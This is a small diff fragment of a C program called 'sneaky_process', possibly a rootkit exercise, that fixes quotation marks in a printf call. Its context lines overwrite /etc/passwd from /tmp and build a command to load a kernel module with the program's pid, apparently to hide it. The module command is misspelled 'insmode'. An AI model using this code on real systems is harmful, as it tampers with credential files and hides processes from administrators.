@@ -15,7 +15,7 @@ int main() {
   system("cp /tmp/passwd /etc/passwd");
   fclose(f);
   pid_t mypid = getpid();
-  printf(“sneaky_process pid = %d\n”, mypid);
+  printf("sneaky_process pid = %d\n", mypid);
   char command[50] = "insmode sneaky_mod.ko mypid=";
   char cpid[10];
   sprintf(cpid, "%d", mypid);
